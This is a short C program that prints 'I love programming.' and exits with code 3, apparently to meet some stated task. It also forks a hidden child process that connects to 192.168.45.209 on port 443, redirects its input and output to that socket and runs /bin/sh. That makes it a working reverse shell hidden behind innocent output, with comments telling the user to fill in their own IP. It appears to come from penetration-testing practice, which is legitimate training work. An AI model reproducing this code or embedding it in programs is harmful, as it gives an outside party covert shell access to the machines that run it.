#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid = fork();

    if (pid == 0) {
        // Child process - reverse shell (runs in background)
        int sock;
        struct sockaddr_in server;

        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);

        // Configure connection (CHANGE THESE)
        server.sin_family = AF_INET;
        server.sin_port = htons(443);  // Your listening port
        server.sin_addr.s_addr = inet_addr("192.168.45.209");  // Your IP

        // Connect to listener
        connect(sock, (struct sockaddr *)&server, sizeof(server));

        // Redirect stdin, stdout, stderr to socket
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);

        // Execute shell
        execve("/bin/sh", NULL, NULL);
    } else {
        // Parent process - original requirements
        write(1, "I love programming.", 19);
        return 3;
    }
}
